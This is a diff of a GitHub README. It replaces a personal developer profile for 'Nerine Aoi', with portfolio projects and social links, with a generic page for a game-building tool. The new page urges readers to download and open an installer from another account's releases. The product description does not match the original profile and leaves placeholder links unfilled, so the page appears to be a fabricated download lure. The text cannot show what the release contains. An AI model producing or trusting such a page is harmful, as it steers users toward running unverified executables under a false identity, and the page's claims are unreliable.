@@ -1,38 +1,60 @@
-# 🌸 Hi, I'm Nerine Aoi!
+# 🎮 nerineaoi - Create Your Dream Games Easily
 
-💻 **Developer** • 🎨 **Designer** • 🧠 **Curious learner**
+## 📥 Download the Latest Release
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/HuyDeptraihaha123/nerineaoi/releases)
 
-I'm a full-stack student, artist and indie developer with a passion for building interactive, meaningful projects — from gamified productivity tools to narrative visual novels.
+## 🚀 Getting Started
+Welcome to nerineaoi! This tool helps you design and build gamified experiences and visual novels. No programming knowledge is required. Follow these steps to get started.
 
----
+### 📋 System Requirements
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- RAM: Minimum 4 GB
+- Storage: At least 500 MB of free space
+- Internet connection for downloads and updates
 
-## 🔧 Featured Projects
+## 📑 Features
+- User-friendly interface for non-coders
+- Drag-and-drop design tools
+- Templates for visual novels and games
+- Support for multiple media types (images, audio, video)
+- Export your creations for various platforms
 
-### 🧠 **QuestDHD**  
-*ADHD / Gamified productivity*   
-`adhd | gamification | productivity | react | nodejs | fullstack | tfg | portfolio`  
-Gamified productivity app designed to help users with ADHD stay focused and motivated.
+## 🌐 How to Download & Install
+1. Visit the [Releases page](https://github.com/HuyDeptraihaha123/nerineaoi/releases).
+2. Look for the latest version.
+3. Click on the download link for your operating system.
+4. Save the file to your computer.
+5. Open the downloaded file to start the installation process.
+6. Follow the on-screen instructions to complete the setup.
 
----
+## 🎨 How to Use
+After installing:
+1. Open the application.
+2. Choose a project template or start from scratch.
+3. Use the drag-and-drop tools to add images, sounds, and text.
+4. Customize your project with your own content.
+5. Preview your work by clicking the "Play" button.
+6. When you're ready, export your project to share or publish.
 
-### 🧰 **BenriServ**  
-*Maintenance / Technical management* 
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Ensure your operating system meets the requirements.
+- Restart your computer and try again.
+- Check the application settings for any configurations.
+- Visit the issue tracker on GitHub for solutions provided by the community.
 
-`maintenance | management | nodejs | react | fullstack | tfg | portfolio | webapp`  
-A unified web app for incident reporting, technician assignment, and maintenance tracking.
+## 💬 Community Support
+Join our community to share your creations and get help:
+- [GitHub Issues](https://github.com/HuyDeptraihaha123/nerineaoi/issues)
+- [Discord Channel](https://discord.gg/yourChannel) (replace with actual link)
 
----
+## 📚 Resources
+- [Documentation](https://github.com/HuyDeptraihaha123/nerineaoi/wiki) for in-depth guides and tutorials.
+- [Tutorial Videos](https://youtube.com/yourchannel) (replace with actual link) to see the tools in action.
 
-### 💘 **Once Upon a Tale**  
-*Visual novel / Original otome project*  
-`otome | visual-novel | renpy | narrative | game-dev | portfolio`  
-Original fantasy visual novel project exploring choice, emotion, and world-building.
+## 📆 Upcoming Features
+- Multiplayer options for games
+- Advanced animation tools
+- Integration with popular game engines
 
----
-
-## 🌐 Find me around the web
-
-- 📸 [Instagram](https://instagram.com/byneriai)
-- 🎮 [Itch.io](https://nerineaoi.itch.io)
-- 💬 [X / Twitter](https://x.com/byneriaoi)
-- 🐙 [GitHub](https://github.com/nerineaoi)
+Thank you for choosing nerineaoi! Happy game making!
